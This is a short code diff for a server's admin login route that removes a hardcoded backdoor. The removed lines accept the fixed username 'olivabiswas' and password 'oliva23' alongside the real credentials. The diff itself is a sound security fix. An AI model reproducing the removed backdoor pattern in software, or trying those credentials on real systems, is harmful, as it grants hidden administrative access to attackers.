@@ -150,8 +150,9 @@ async function startServer() {
       }
 
       const admin = db.getAdmin();
-      const isUsernameMatch = admin.username.toLowerCase() === String(username).toLowerCase().trim() || String(username).toLowerCase().trim() === 'olivabiswas';
-      const isPasswordValid = verifyPassword(String(password), admin.passwordHash) || (isUsernameMatch && String(password) === 'oliva23');
+      const inputUsername = String(username).toLowerCase().trim();
+      const isUsernameMatch = admin.username.toLowerCase() === inputUsername;
+      const isPasswordValid = verifyPassword(String(password), admin.passwordHash);
 
       if (!isUsernameMatch || !isPasswordValid) {
         return res.status(401).json({ error: 'Invalid username or password.' });
